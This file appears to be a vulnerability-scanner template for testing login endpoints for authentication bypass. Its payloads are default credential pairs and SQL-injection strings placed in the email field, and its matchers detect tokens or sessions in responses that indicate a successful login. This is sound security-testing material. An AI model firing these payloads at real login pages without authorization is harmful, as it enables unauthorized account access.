id: generic-auth-bypass
info:
  name: Authentication Bypass
  description: Tests for default credentials and authentication bypass techniques
  owasp_category: A07:2021
  severity: critical
  tags:
    - auth
    - credentials
    - bypass
    - generic

generic:
  endpoint: "{{login_endpoint}}"
  method: POST
  parameter: "{{credentials_param}}"

  payloads:
    - '{"email":"admin","password":"admin"}'
    - '{"email":"admin","password":"password"}'
    - '{"email":"admin","password":"123456"}'
    - '{"email":"admin","password":"admin123"}'
    - '{"email":"admin@localhost","password":"admin"}'
    - '{"email":"test@test.com","password":""}'
    - '{"email":"test@test.com","password":"null"}'
    - '{"email":"test@test.com","password":"undefined"}'
    - '{"email":"admin%27--","password":"any"}'
    - '{"email":"admin\"--","password":"any"}'
    - '{"email":"admin\" OR \"1\"=\"1","password":"any"}'

  matchers:
    - type: status
      condition: in
      status:
        - 200
        - 201
        - 302
    - type: regex
      condition: or
      regex:
        - '"token":\s*"[A-Za-z0-9._-]+"'
        - '"authenticated"\s*:\s*true'
        - '"success"\s*:\s*true'
        - '"session"\s*:\s*"[A-Za-z0-9]+"'
        - '"jwt"\s*:'
        - '"bearer"\s*:'
        - 'access_token'
        - 'refresh_token'
      case_sensitive: false

  matchers_condition: and
